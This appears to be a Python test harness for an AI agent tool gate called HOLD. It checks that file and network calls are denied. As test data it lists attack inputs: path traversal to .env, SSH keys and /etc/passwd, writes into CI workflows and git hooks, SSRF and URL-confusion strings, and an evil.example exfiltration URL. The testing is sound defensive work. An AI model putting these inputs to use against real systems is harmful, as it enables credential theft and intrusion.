#!/usr/bin/env python3
"""
Adversarial tests for the HOLD gate and gateway (stdlib only).

    python harness.py               run these tests plus every tests/test_*.py
    python harness.py --bench       print gate-only p50/p95 decision latency on this machine
    python harness.py --scan-bench  probe Semgrep, then time real write scans on this machine

Every test exercises the real gate and real file or network executors against a
temporary workspace. Nothing is mocked except where a test says so explicitly (the
fake HTTP opener used to count dispatches).
"""

from __future__ import annotations

import argparse
import http.server
import json
import os
import subprocess
import sys
import tempfile
import textwrap
import threading
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))

from hold.core import (  # noqa: E402
    BUGGY_APP, FIXED_APP, CapabilityGate, Gateway, IntentReceipt, JsonlWriter, Telemetry,
    gate_latency_ns,
)


class RecordingOpener:
    """Stands in for the HTTP client so tests can prove whether a request was dispatched."""

    def __init__(self):
        self.urls = []

    def __call__(self, url: str) -> str:
        self.urls.append(url)
        return "fetched"


class HoldTestCase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.base = Path(self._tmp.name)
        self.ws = self.base / "workspace"
        (self.ws / "src" / "flask").mkdir(parents=True)
        (self.ws / "src" / "flask" / "app.py").write_bytes(BUGGY_APP.encode("utf-8"))
        (self.ws / ".env").write_text("FAKE_TOKEN=not-a-real-secret\n", encoding="utf-8")
        (self.ws / "README.md").write_text("readme\n", encoding="utf-8")
        (self.base / "outside.txt").write_text("outside\n", encoding="utf-8")
        self.audit = self.base / "audit.jsonl"
        self.telemetry = Telemetry([JsonlWriter(self.audit)], flush_interval=0.01)
        self.opener = RecordingOpener()

    def tearDown(self):
        self.telemetry.close()
        self._tmp.cleanup()

    def receipt(self, **caps):
        capabilities = {"read": ["src/**", "tests/**"], "write": ["src/flask/app.py"],
                        "network_egress": False, "host_allowlist": []}
        capabilities.update(caps)
        return IntentReceipt.from_dict({"task_id": "t", "intent": "fix app.py",
                                        "workspace_root": "workspace",
                                        "capabilities": capabilities}, self.base)

    def gateway(self, **caps):
        return Gateway(self.receipt(**caps), self.telemetry, http_open=self.opener)

    def assertDenied(self, hold, tool, args, msg=None):
        result = hold.call(tool, args)
        self.assertTrue(result.is_error, msg or f"expected DENY for {tool} {args}: {result.text}")
        return result

    def symlink_or_skip(self, link: Path, target: Path):
        try:
            link.symlink_to(target)
        except (OSError, NotImplementedError) as exc:
            self.skipTest(f"cannot create symlinks here ({exc}); run on Linux/macOS or Windows dev mode")


class HappyPath(HoldTestCase):
    def test_allowed_read_returns_file_content(self):
        result = self.gateway().call("read_file", {"path": "src/flask/app.py"})
        self.assertFalse(result.is_error, result.text)
        self.assertEqual(result.text, BUGGY_APP)

    def test_allowed_write_changes_the_file_on_disk(self):
        result = self.gateway().call("write_file", {"path": "src/flask/app.py", "content": FIXED_APP})
        self.assertFalse(result.is_error, result.text)
        self.assertEqual((self.ws / "src/flask/app.py").read_bytes(), FIXED_APP.encode("utf-8"))


class FilesystemAttacks(HoldTestCase):
    def test_protected_reads_denied(self):
        hold = self.gateway(read=["**"])  # even with a read-everything receipt
        for path in [".env", ".ENV", ".env.production", "src/.env", "src/.git/config",
                     ".git/config", "src/flask/server.pem", ".aws/credentials", ".ssh/id_rsa"]:
            self.assertDenied(hold, "read_file", {"path": path})

    def test_protected_writes_denied_even_with_write_everything_receipt(self):
        hold = self.gateway(write=["**"])
        for path in [".env", "src/.env", ".github/workflows/deploy.yml", ".git/hooks/pre-commit",
                     ".claude/settings.json", ".mcp.json"]:
            self.assertDenied(hold, "write_file", {"path": path, "content": "pwn"})
        self.assertEqual((self.ws / ".env").read_text(encoding="utf-8"), "FAKE_TOKEN=not-a-real-secret\n")

    def test_traversal_and_non_canonical_paths_denied(self):
        hold = self.gateway(read=["**"], write=["**"])
        paths = ["src/../.env", "src/flask/../app.py", "../outside.txt", "/etc/passwd",
                 "C:/Windows/win.ini", "\\\\server\\share\\x", "src/./flask/app.py",
                 "src//flask/app.py", ".env.", "src/flask/app.py.", "src/flask/app.py:stream",
                 "~/.ssh/id_rsa", "", "src/flask/app.py\x00.txt", "src\\..\\.env"]
        for path in paths:
            self.assertDenied(hold, "read_file", {"path": path})
            self.assertDenied(hold, "write_file", {"path": path, "content": "x"})

    def test_paths_outside_allowlists_denied(self):
        hold = self.gateway()
        self.assertDenied(hold, "read_file", {"path": "README.md"})
        self.assertDenied(hold, "write_file", {"path": "src/flask/other.py", "content": "x"})
        self.assertDenied(hold, "write_file", {"path": "src/flask/APP.py", "content": "x"})

    def test_symlink_escape_denied(self):
        self.symlink_or_skip(self.ws / "src" / "escape.txt", self.base / "outside.txt")
        hold = self.gateway(read=["**"], write=["**"])
        self.assertDenied(hold, "read_file", {"path": "src/escape.txt"})
        self.assertDenied(hold, "write_file", {"path": "src/escape.txt", "content": "pwn"})
        self.assertEqual((self.base / "outside.txt").read_text(encoding="utf-8"), "outside\n")

    def test_symlink_to_protected_file_inside_workspace_denied(self):
        self.symlink_or_skip(self.ws / "src" / "config.txt", self.ws / ".env")
        self.assertDenied(self.gateway(), "read_file", {"path": "src/config.txt"})

    def test_write_through_a_link_inside_the_workspace_denied(self):
        app = self.ws / "src" / "flask" / "app.py"
        self.symlink_or_skip(self.ws / "src" / "flask" / "notes.txt", app)
        try:
            (self.ws / "src" / "alias").symlink_to(self.ws / "src" / "flask", target_is_directory=True)
        except OSError as exc:
            self.skipTest(f"cannot create directory symlinks here ({exc})")
        hold = self.gateway(write=["src/**"])
        for path in ["src/flask/notes.txt", "src/alias/app.py"]:
            result = self.assertDenied(hold, "write_file", {"path": path, "content": "pwn"})
            self.assertIn("write through a link not allowed", result.text)
        self.assertEqual(app.read_bytes(), BUGGY_APP.encode("utf-8"))
        # Reads keep their existing rules (both paths checked against the read allowlist).
        self.assertFalse(hold.call("read_file", {"path": "src/flask/notes.txt"}).is_error)

    def test_case_alias_write_denied_on_case_insensitive_filesystems(self):
        if not (self.ws / "src" / "flask" / "APP.py").exists():
            self.skipTest("case-sensitive filesystem: APP.py would be a different, new file")
        result = self.assertDenied(self.gateway(write=["src/**"]), "write_file",
                                   {"path": "src/flask/APP.py", "content": "pwn"})
        self.assertIn("write through a link not allowed", result.text)
        self.assertEqual((self.ws / "src" / "flask" / "app.py").read_bytes(), BUGGY_APP.encode("utf-8"))


class ToolSurfaceAttacks(HoldTestCase):
    def test_unknown_and_unoffered_tools_denied(self):
        hold = self.gateway()
        for tool in ["bash_exec", "run_command", "git_push", "Read", "Bash", "", "read_file "]:
            self.assertDenied(hold, tool, {"path": "src/flask/app.py"})

    def test_malformed_arguments_denied(self):
        hold = self.gateway()
        for args in [{"path": "src/flask/app.py", "extra": 1}, {}, {"path": ["src/flask/app.py"]},
                     {"path": None}, ["src/flask/app.py"], None, {"PATH": "src/flask/app.py"}]:
            self.assertDenied(hold, "read_file", args)
        self.assertDenied(hold, "write_file", {"path": "src/flask/app.py"})
        self.assertDenied(hold, "write_file", {"path": "src/flask/app.py", "content": b"bytes"})

    def test_gate_never_raises_on_garbage(self):
        gate = CapabilityGate(self.receipt())
        for tool, args in [(None, None), (123, {}), ("read_file", {"path": "\ud800"}),
                           ("fetch_url", {"url": "http://[::1"}), ("fetch_url", {"url": "http://a:99999/"}),
                           (object(), object())]:
            self.assertFalse(gate.evaluate(tool, args).allowed)


class NetworkAttacks(HoldTestCase):
    def test_fetch_denied_without_dispatch_when_egress_not_granted(self):
        self.assertDenied(self.gateway(), "fetch_url",
                          {"url": "https://iamtesting.free.beeceptor.com/reproduce_issue.py"})
        self.assertEqual(self.opener.urls, [])

    def test_url_tricks_denied_without_dispatch(self):
        hold = self.gateway(network_egress=True, host_allowlist=["api.example.com"])
        for url in ["http://api.example.com@evil.com/", "http://evil.com/?h=api.example.com",
                    "http://api.example.com.evil.com/", "http://user:pw@api.example.com/",
                    "file:///etc/passwd", "ftp://api.example.com/", "http://169.254.169.254/latest/",
                    "http://127.0.0.1:9999/canary", "api.example.com/x"]:
            self.assertDenied(hold, "fetch_url", {"url": url})
        self.assertEqual(self.opener.urls, [])

    def test_allowlisted_host_dispatches_exactly_once(self):
        hold = self.gateway(network_egress=True, host_allowlist=["api.example.com"])
        result = hold.call("fetch_url", {"url": "https://API.example.com./v1"})
        self.assertFalse(result.is_error, result.text)
        self.assertEqual(self.opener.urls, ["https://API.example.com./v1"])

    def test_redirects_are_not_followed(self):
        class Redirect(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(302)
                self.send_header("Location", "http://evil.example/")
                self.end_headers()

            def log_message(self, *a):
                pass

        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Redirect)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            receipt = self.receipt(network_egress=True, host_allowlist=["127.0.0.1"])
            hold = Gateway(receipt, self.telemetry)  # real HTTP client
            result = hold.call("fetch_url", {"url": f"http://127.0.0.1:{server.server_address[1]}/"})
            self.assertTrue(result.is_error, result.text)
            self.assertIn("302", result.text)
        finally:
            server.shutdown()
            server.server_close()


class TelemetryAndReceipt(HoldTestCase):
    def test_telemetry_failure_cannot_turn_deny_into_allow(self):
        def broken(batch):
            raise RuntimeError("clickhouse down")

        telemetry = Telemetry([broken], flush_interval=0.01)
        hold = Gateway(self.receipt(), telemetry, http_open=self.opener)
        self.assertTrue(hold.call("fetch_url", {"url": "https://evil.example/"}).is_error)
        self.assertFalse(hold.call("read_file", {"path": "src/flask/app.py"}).is_error)
        telemetry.close()
        self.assertEqual(self.opener.urls, [])
        self.assertGreaterEqual(telemetry.writer_errors.get("function", 0), 1)

    def test_audit_row_is_on_disk_when_the_process_dies_right_after_answering(self):
        """Real subprocess: Gateway.call, then os._exit(0) at once (no close, no flush).
        The telemetry thread's interval is 60 s, so only the synchronous JSONL write can
        have put the row on disk."""
        audit = self.base / "killed.jsonl"
        code = textwrap.dedent(f"""
            import os, sys
            sys.path.insert(0, {str(ROOT)!r})
            from pathlib import Path
            from hold.core import Gateway, IntentReceipt, JsonlWriter, Telemetry
            receipt = IntentReceipt.from_dict({{"task_id": "t", "intent": "i", "workspace_root": "workspace",
                "capabilities": {{"read": ["src/**"], "write": []}}}}, Path({str(self.base)!r}))
            hold = Gateway(receipt, Telemetry([JsonlWriter(Path({str(audit)!r}))], flush_interval=60))
            result = hold.call("fetch_url", {{"url": "https://evil.example/x"}}, request_id="r1")
            os._exit(0 if result.is_error else 3)
        """)
        proc = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=60)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        rows = [json.loads(line) for line in audit.read_text(encoding="utf-8").splitlines()]
        self.assertEqual([(r["decision"], r["sink"], r["request_id"]) for r in rows],
                         [("DENY", "NETWORK_EGRESS", "r1")])

    def test_failing_synchronous_writer_never_changes_a_decision(self):
        class BrokenLocalWriter:
            synchronous = True

            def __call__(self, batch):
                raise OSError("disk full")

        telemetry = Telemetry([BrokenLocalWriter()], flush_interval=0.01)
        hold = Gateway(self.receipt(), telemetry, http_open=self.opener)
        self.assertTrue(hold.call("fetch_url", {"url": "https://evil.example/"}).is_error)
        self.assertFalse(hold.call("read_file", {"path": "src/flask/app.py"}).is_error)
        telemetry.close()
        self.assertEqual(telemetry.writer_errors.get("BrokenLocalWriter"), 2)
        self.assertEqual(self.opener.urls, [])

    def test_events_do_not_contain_file_content_or_url_query(self):
        hold = self.gateway()
        hold.call("write_file", {"path": "src/flask/app.py", "content": "SECRET_IN_CONTENT"})
        hold.call("fetch_url", {"url": "https://evil.example/collect?k=SECRET_IN_URL"})
        self.telemetry.close()
        log = self.audit.read_text(encoding="utf-8")
        self.assertNotIn("SECRET_IN_CONTENT", log)
        self.assertNotIn("SECRET_IN_URL", log)
        events = [json.loads(line) for line in log.splitlines()]
        self.assertEqual([e["decision"] for e in events], ["ALLOW", "DENY"])
        self.assertEqual(events[1]["exec_status"], "not_run")

    def test_receipt_cannot_drop_default_protection_or_grant_unsupported_tools(self):
        receipt = self.receipt(protected=[])
        self.assertIn("**/.env", receipt.protected)
        with self.assertRaises(ValueError):
            self.receipt(shell_execution=True)
        with self.assertRaises(ValueError):
            self.receipt(git_push=True)
        with self.assertRaises(ValueError):
            self.receipt(network="yes")  # unknown field

    def test_receipt_digest_changes_with_content(self):
        self.assertNotEqual(self.receipt().digest, self.receipt(write=["src/**"]).digest)


def scan_bench(n: int) -> None:
    """Real Semgrep, real files: one probe scan, then n scans of the demo's benign fix."""
    from hold.scan import DEFAULT_RULES, SemgrepScanner, probe

    scanner = SemgrepScanner(DEFAULT_RULES)
    print(f"semgrep: {scanner.semgrep_bin}  rules: {scanner.rules_path}  TEMP for semgrep: {scanner.scratch_dir}")
    works, detail = probe(scanner)
    print(f"probe (first scan in this process): {'OK' if works else 'FAILED'}: {detail}")
    if not works:
        print("Semgrep cannot scan on this host, so every Python write would be DENIED (fail closed).")
        sys.exit(1)
    samples = []
    for _ in range(n):
        verdict = scanner("src/flask/app.py", BUGGY_APP, FIXED_APP)
        if not verdict.allowed:
            print(f"unexpected DENY of the benign fix: {verdict.reason}")
            sys.exit(1)
        samples.append(verdict.elapsed_ms)
    samples.sort()
    print(f"write scan wall time, benign fix (n={n}, {sys.platform}, Semgrep {scanner.last_version}): "
          f"min {samples[0]:.0f} ms, median {samples[len(samples) // 2]:.0f} ms, max {samples[-1]:.0f} ms")
    print("Includes Semgrep process start-up; excludes MCP transport and model time.")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--bench", action="store_true", help="gate-only latency, this machine")
    parser.add_argument("--scan-bench", type=int, nargs="?", const=5, metavar="N",
                        help="Semgrep probe + N timed write scans (default 5), this machine")
    args, rest = parser.parse_known_args()
    if args.scan_bench is not None:
        scan_bench(max(1, args.scan_bench))
        return
    if args.bench:
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "workspace").mkdir()
            receipt = IntentReceipt.from_dict({"task_id": "bench", "intent": "bench", "workspace_root": "workspace",
                                               "capabilities": {"read": ["src/**"], "write": ["src/flask/app.py"]}},
                                              Path(tmp))
            p50, p95 = gate_latency_ns(CapabilityGate(receipt), n=20000)
            print(f"gate-only decision latency (n=20000, mixed calls, {sys.platform}, Python "
                  f"{sys.version.split()[0]}): p50 {p50 / 1000:.1f} us, p95 {p95 / 1000:.1f} us")
            print("Excludes MCP transport, tool execution, telemetry and model time.")
        return
    root = Path(__file__).resolve().parent
    suite = unittest.defaultTestLoader.loadTestsFromModule(sys.modules[__name__])
    if (root / "tests").is_dir():
        suite.addTests(unittest.defaultTestLoader.discover(str(root / "tests"), top_level_dir=str(root)))
    verbosity = 1 if "-q" in rest else 2
    result = unittest.TextTestRunner(verbosity=verbosity).run(suite)
    sys.exit(0 if result.wasSuccessful() else 1)


if __name__ == "__main__":
    main()
